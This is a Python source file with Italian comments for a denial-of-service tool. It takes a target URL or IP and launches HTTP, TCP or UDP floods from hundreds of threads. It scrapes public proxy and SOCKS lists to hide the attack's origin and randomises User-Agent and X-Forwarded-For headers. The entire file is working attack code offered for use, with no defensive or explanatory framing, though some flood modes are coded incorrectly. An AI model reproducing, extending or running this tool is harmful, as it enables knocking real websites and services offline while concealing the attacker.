import socket
import socks
import threading
import random
import re
import urllib.request
import os
import sys

from bs4 import BeautifulSoup

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # per evitare di visualizzare l'errore d'avvio di scapy

if sys.platform.startswith("linux"): # se si Ã¨ sotto linux
    from scapy.all import * # importa scapy
elif sys.platform.startswith("freebsd"): # o sotto freebsd
    from scapy.all import * # importa scapy
else: # altrimenti
	print ("TCP/UDP FLOOD ARE NOT SUPPORTED UNDER THIS SYSTEM. YOU MUST USE HTTP FLOOD.") # printa questo


useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
			"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
			"Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
			"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
			"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
			"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
			"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",]


def checkurl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
	global url
	global url2
	global urlport

	url = input("Insert URL/IP: ")

	if url == "":
		print ("Please enter the url.")
		checkurl()

	try:
		if url[0]+url[1]+url[2]+url[3] == "www.":
			url = "http://" + url
		elif url[0]+url[1]+url[2]+url[3] == "http":
			pass
		else:
			url = "http://" + url
	except:
		print("You mistyped, try again.")
		checkurl()

	try:
		url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
	except:
		url2 = url.replace("http://", "").replace("https://", "").split("/")[0]

	try:
		urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
	except:
		urlport = "80"

	floodmode()

def floodmode():
	global choice1
	choice1 = input("Do you want to perform HTTP flood '0', TCP flood '1' or UDP flood '2' ? ")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
			if os.getuid() != 0: # se il programma NON e' stato eseguito come root:
			    print("You need to run this program as root to use TCP/UDP flooding.") # printa questo
			    exit(0) # e esce
			else: # altrimenti
				floodport() # continua
		except:
			pass
	elif choice1 == "2":
		try:
			if os.getuid() != 0: # se il programma NON e' stato eseguito come root:
			    print("You need to run this program as root to use TCP/UDP flooding.") # printa questo
			    exit(0) # e esce
			else: # altrimenti
				floodport() # continua
		except:
			pass
	else:
		print ("You mistyped, try again.")
		floodmode()

def floodport():
	global port
	try:
		port = int(input("Enter the port you want to flood: "))
		portlist = range(65535) # range di tutte le porte informatiche
		if port in portlist: # se la porta selezionata rientra nel range
			pass # continua
		else: # altrimenti
			print ("You mistyped, try again.")
			floodport() # riparte la funzione e ti fa riscrivere
	except ValueError: # se da' errore di valore
		print ("You mistyped, try again.") # printa questo e
		floodport() # riparte la funzione e ti fa riscrivere
	proxymode()

def proxymode():
	global choice2
	choice2 = input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()

def choiceproxysocks():
	global choice3
	choice3 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
	else:
		print ("You mistyped, try again.")
		choiceproxysocks()

def choicedownproxy():
	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
	if choice4 == "y":
		choicemirror1()
	else:
		proxylist()

def choicedownsocks():
	choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
	if choice4 == "y":
		choicemirror2()
	else:
		proxylist()

def choicemirror1():
	global urlproxy
	choice5 = input ("Download from: free-proxy-list.net='0', inforge.net='1' or skypegrab.com='2' ")
	if choice5 == "0":
		urlproxy = "http://free-proxy-list.net/"
		proxyget1()
	elif choice5 == "1":
		inforgeget()
	elif choice5 == "2":
		urlproxy = "http://skypegrab.net/proxy/http.txt"
		proxyget2()
	else:
		print("You mistyped, try again.")
		choicemirror1()

def choicemirror2():
	global urlproxy
	choice5 = input ("Download from: socks-proxy.net='0', inforge.net='1' or skypegrab.com='2' ")
	if choice5 == "0":
		urlproxy = "https://www.socks-proxy.net/"
		proxyget1()
	elif choice5 == "1":
		inforgeget()
	elif choice5 == "2":
		urlproxy = "http://skypegrab.net/proxy/socks.txt"
		proxyget2()
	else:
		print("You mistyped, try again.")
		choicemirror2()

def proxyget1(): # lo dice il nome, questa funzione scarica i proxies
	try:
		req = urllib.request.Request(("%s") % (urlproxy))       # qua impostiamo il sito da dove scaricare.
		req.add_header("User-Agent", random.choice(useragents)) # siccome il format del sito e' identico sia
		sourcecode = urllib.request.urlopen(req)                # per free-proxy-list.net che per socks-proxy.net,
		part = str(sourcecode.read())                           # imposto la variabile urlproxy in base a cosa si sceglie.
		part = part.split("<tbody>")
		part = part[1].split("</tbody>")
		part = part[0].split("<tr><td>")
		proxies = ""
		for proxy in part:
			proxy = proxy.split("</td><td>")
			try:
				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
			except:
				pass
		out_file = open("proxy.txt","w")
		out_file.write("")
		out_file.write(proxies)
		out_file.close()
		print ("Proxies downloaded successfully.")
	except: # se succede qualche casino
		print ("\nERROR!\n")
	proxylist() # se va tutto liscio allora prosegue eseguendo la funzione proxylist()

def proxyget2():
	try:
		if os.path.isfile("proxy.txt"):
			out_file = open("proxy.txt","w") # cancella tutto il contenuto
			out_file.write("")               # di proxy.txt
			out_file.close()
		else:
			pass
		req = urllib.request.Request(urlproxy) # url corrisponde a una serie di urls impostati sotto.
		req.add_header("User-Agent", random.choice(useragents)) # aggiunge uno user agent a caso dalla lista sopra
		sourcecode = urllib.request.urlopen(req, timeout = 10) # scaricamento sourcecode pagina + timeout impostato a 10
		for line in sourcecode :
				ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line)) # cerca proxy
				ipf = list(set(ip)) # cancella i doppioni
				if ipf: # se trova ip prosegue
					for x in ipf:
						out_file = open("proxy.txt","a")
						while True:
							out_file.write(x+"\n") # scrive ip uno per uno nel file proxy.txt
							out_file.close()
							break # appena finisce ferma il ciclo
		print ("Proxies downloaded successfully.") # se li scarica correttamente, printa questa scritta
	except:
		print ("\nERROR!\n") # printa qua
	proxylist() # se tutto e' andato a buon fine, prosegue eseguendo proxylist()

def inforgeget(): # anche questa funzione scarica proxy pero' da inforge.net
	try:
		if os.path.isfile("proxy.txt"):
			out_file = open("proxy.txt","w") # cancella tutto il contenuto
			out_file.write("")               # di proxy.txt
			out_file.close()
		else:
			pass
		url = "https://www.inforge.net/xi/forums/liste-proxy.1118/"
		soup = BeautifulSoup(urllib.request.urlopen(url)) # per strasformare in "zuppa" la source del sito
		print ("\nDownloading from inforge.net in progress...")
		base = "https://www.inforge.net/xi/"                       # questi comandi servono per trovare i link nella sezione
		for tag in soup.find_all("a", {"class":"PreviewTooltip"}): # liste-proxy del forum
			links = tag.get("href")                                #
			final = base + links                                   # composizione links
			result = urllib.request.urlopen(final)                 # finalmente apre i link trovati
			for line in result :
				ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line)) # cerca gli ip:porta nelle pagine
				if ip: # se ha trovato gli ip prosegue
					for x in ip:
						out_file = open("proxy.txt","a") # scrittura singolo ip nella proxy.txt
						while True:
							out_file.write(x+"\n")
							out_file.close()
							break # il ciclo si ferma non appena ha finito
		print ("Proxies downloaded successfully.") # se li scarica correttamente, printa questa scritta
	except: # se qualcosa va storto
		print ("\nERROR!\n") # printa qua
	proxylist() # se tutto e' andato a buon fine, prosegue eseguendo proxylist()

def proxylist():
	global proxies
	out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
	proxies = open(out_file).readlines()
	numthreads()

def numthreads():
	global threads
	try:
		threads = int(input("Insert number of threads (800): "))
	except ValueError:
		threads = 800
		print ("800 threads selected.\n")
	begin()

def begin():
	choice6 = input("Press 'Enter' to start attack: ")
	if choice6 == "":
		loop()
	elif choice6 == "Enter": #lool
		loop()
	elif choice6 == "enter": #loool
		loop()
	else:
		exit(0)

def loop():
	global threads
	global get_host
	global acceptall
	global connection
	global go
	global x
	if choice1 == "0": # se si e' scelta la http flood, scrive gli header "statici" per non appesantire i threads
		get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
		acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", "Accept-Encoding: gzip, deflate\r\n", "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"]
		connection = "Connection: Keep-Alive\r\n" # la keep alive torna sempre utile lol
	x = 0 # thanks therunixx, my friend
	go = threading.Event()
	if choice1 == "1": # se si e' scelto tcp flood
		if choice2 == "y": # e si e scelta la modalita' proxying
			if choice3 == "0": # e si sono scelti gli HTTP proxy
				for x in range(threads):
					tcpfloodproxed(x+1).start() # starta la classe apposita
					print ("Thread " + str(x) + " ready!")
				go.set() # questo fa avviare i threads appena sono tutti pronti
			else: # altrimenti se si sono scelto Ã¨ il tcp flood con socks
				for x in range(threads):
					tcpfloodsocked(x+1).start() # starta la classe apposita
					print ("Thread " + str(x) + " ready!")
				go.set() # questo fa avviare i threads appena sono tutti pronti
		else: # se non si sono stati scelti proxy o socks
			for x in range(threads):
				tcpflood(x+1).start() # starta la classe apposita
				print ("Thread " + str(x) + " ready!")
			go.set() # questo fa avviare i threads appena sono tutti pronti
	else: # oppure:
		if choice1 == "2": # se si e' scelto l'UDP flood
			if choice2 == "y": # e si e' scelta la modalita' proxying
				if choice3 == "0": # e si sono scelti gli HTTP proxy
					for x in range(threads):
						udpfloodproxed(x+1).start() # starta la classe apposita
						print ("Thread " + str(x) + " ready!")
					go.set() # questo fa avviare i threads appena sono tutti pronti
				else: # se si sono scelti i socks
					for x in range(threads):
						udpfloodsocked(x+1).start() # starta la classe apposita
						print ("Thread " + str(x) + " ready!")
					go.set() # questo fa avviare i threads appena sono tutti pronti
			else: # se non si sono scelti proxy o socks per l'udp flood
				for x in range(threads):
					udpflood(x+1).start() # starta la classe apposita
					print ("Thread " + str(x) + " ready!")
				go.set() # questo fa avviare i threads appena sono tutti pronti
		else: # se si Ã¨ scelto l'http flood
			if choice2 == "y": # se abbiamo scelto la modalita' proxying
				if choice3 == "0": # e abbiamo scelto gli HTTP proxy
					for x in range(threads):
						requestproxy(x+1).start() # starta la classe apposita
						print ("Thread " + str(x) + " ready!")
					go.set() # questo fa avviare i threads appena sono tutti pronti
				else: # se abbiamo scelto i socks
					for x in range(threads):
						requestsocks(x+1).start() # starta la classe apposita
						print ("Thread " + str(x) + " ready!")
					go.set() # questo fa avviare i threads appena sono tutti pronti
			else: # altrimenti manda richieste normali non proxate.
				for x in range(threads):
					requestdefault(x+1).start() # starta la classe apposita
					print ("Thread " + str(x) + " ready!")
				go.set() # questo fa avviare i threads appena sono tutti pronti

class tcpfloodproxed(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		data = random._urandom(1024) # data per il pacchetto random
		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # costruzione pacchetto tcp + data
		current = x # per dare l'id al thread
		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
			proxy = proxies[current].strip().split(':')
		else: # altrimenti lo prende a random
			proxy = random.choice(proxies).strip().split(":")
		go.wait() # aspetta che tutti i proxy siano pronti
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # comando per il proxying HTTP
				s = socks.socksocket() # creazione socket
				s.connect((str(url2),int(port))) # si connette
				s.send(p) # ed invia
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
			except: # se si verifica un errore
				s.close() # chiude il thread e ricomincia

class tcpfloodsocked(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		data = random._urandom(1024) # data per il pacchetto random
		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # costruzione pacchetto tcp + data
		current = x # per dare l'id al thread
		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
			proxy = proxies[current].strip().split(':')
		else: # altrimenti lo prende a random
			proxy = random.choice(proxies).strip().split(":")
		go.wait() # aspetta che threads siano pronti
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per il proxying via SOCKS
				s = socks.socksocket() # creazione socket
				s.connect((str(url2),int(port))) # si connette
				s.send(p) # ed invia
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
			except: # se si verifica un errore
				s.close() # intanto chiude il precedente socket non funzionante
				try:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # poi prova ad utilizzare SOCKS4, magari e' questo il problema dell'errore
					s = socks.socksocket() # creazione socket
					s.connect((str(url2),int(port))) # connessione
					s.send(p) # invio
					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
				except: # se nemmeno questo funge, allora il sock e' down
					print ("Sock down. Retrying request. @", self.counter)
					s.close() # chiude il socket e ricomincia ciclo

class tcpflood(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		data = random._urandom(1024) # data per il pacchetto random
		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # costruzione pacchetto tcp + data
		go.wait() # aspetta che tutti i threads siano pronti
		while True: # ciclo infinito
			try: # il try per non far chiudere il programma se qualcosa va storto
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione solito socket
				s.connect((str(url2),int(port))) # connessione al target
				s.send(p) # questo manda il pacchetto tcp creato al target
				print ("Request Sent! @", self.counter) # print richiesta + counter
			except: # se si verifica un errore
				s.close() # lo ignora e ricomincia il ciclo

class udpfloodproxed(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		data = random._urandom(1024) # data per il pacchetto random
		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) # crea pacchetto udp classico + data
		current = x # per dare l'id al thread
		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
			proxy = proxies[current].strip().split(':')
		else: # altrimenti lo prende a random
			proxy = random.choice(proxies).strip().split(":")
		go.wait() # aspetta che threads sono pronti
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # comando per il proxying HTTP
				s = socks.socksocket() # creazione socket
				s.connect((str(url2),int(port))) # connessione
				s.send(p) # invio
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
			except: # se qualcosa va storto
				s.close() # chiude il socket

class udpfloodsocked(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		data = random._urandom(1024) # data per il pacchetto random
		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) # crea pacchetto udp classico + data
		current = x # per dare l'id al thread
		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
			proxy = proxies[current].strip().split(':')
		else: # altrimenti lo prende a random
			proxy = random.choice(proxies).strip().split(":")
		go.wait() # aspetta che threads siano pronti
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per il proxying con SOCKS
				s = socks.socksocket() # creazione socket
				s.connect((str(url2),int(port))) # connessione
				s.send(p) # invio
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # req + counter
			except: # se qualcosa va storto questo except chiude il socket e si collega al try sotto
				s.close() # intanto chiude il precedente socket non funzionante
				try:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # poi prova ad utilizzare SOCKS4, magari e' questo il problema dell'errore
					s = socks.socksocket() # creazione socket
					s.connect((str(url2),int(port))) # connessione
					s.send(p) # invio
					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # req + counter
				except: # se nemmeno questo funge, allora il sock e' down
					print ("Sock down. Retrying request. @", self.counter)
					s.close() # chiude il socket e ricomincia ciclo

class udpflood(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		data = random._urandom(1024) # data per il pacchetto random
		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) # crea pacchetto udp classico + data
		go.wait() # aspetta che i threads siano pronti
		while True: # ciclo infinito
			try: # il try per non far chiudere il programma se si verifica qualche errore
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
				s.connect((str(url2),int(port))) # connessione al target
				s.send(p) # questo manda il pacchetto udp creato al target
				print ("Request Sent! @", self.counter) # print req + counter
			except: # se si verifica un errore
				s.close() # lo ignora e ricomincia il ciclo

class requestproxy(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # scelta useragent a caso
		accept = random.choice(acceptall) # scelta header accept a caso
		randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
		forward = "X-Forwarded-For: " + randomip + "\r\n" # X-Forwarded-For, un header HTTP che permette di incrementare anonimato (vedi google per info)
		request = get_host + useragent + accept + forward + connection + "\r\n" # ecco la final request
		current = x # per dare l'id al thread
		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
			proxy = proxies[current].strip().split(':')
		else: # altrimenti lo prende a random
			proxy = random.choice(proxies).strip().split(":")
		go.wait() # aspetta che i threads siano pronti
		while True: # ciclo infinito
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # ecco il nostro socket
				s.connect((str(proxy[0]), int(proxy[1]))) # connessione al proxy
				s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print delle richieste
			except:
				s.close() # se qualcosa va storto, chiude il socket e il ciclo ricomincia

class requestsocks(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # scelta proxy a caso
		accept = random.choice(acceptall) # scelta accept a caso
		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
		current = x # per dare l'id al thread
		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
			proxy = proxies[current].strip().split(':')
		else: # altrimenti lo prende a random
			proxy = random.choice(proxies).strip().split(":")
		go.wait() # aspetta che threads siano pronti
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per proxarci con i socks
				s = socks.socksocket() # creazione socket con pysocks
				s.connect((str(url2), int(urlport))) # connessione
				s.send (str.encode(request)) # invio
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
			except: # se qualcosa va storto questo except chiude il socket e si collega al try sotto
				s.close() # chiude socket
				try: # il try prova a vedere se l'errore e' causato dalla tipologia di socks errata, infatti prova con SOCKS4
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # prova con SOCKS4
					s = socks.socksocket() # creazione nuovo socket
					s.connect((str(url2), int(urlport))) # connessione
					s.send (str.encode(request)) # invio
					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
				except:
					print ("Sock down. Retrying request. @", self.counter)
					s.close() # se nemmeno con quel try si e' riuscito a inviare niente, allora il sock e' down e chiude il socket.

class requestdefault(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # useragent a caso
		accept = random.choice(acceptall) # accept a caso
		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
		go.wait() # aspetta che i threads siano pronti
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
				s.connect((str(url2), int(urlport))) # connessione
				s.send (str.encode(request)) # invio
				print ("Request sent! @", self.counter) # print req + counter
			except: # se qualcosa va storto
				s.close() # chiude socket e ricomincia

checkurl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco.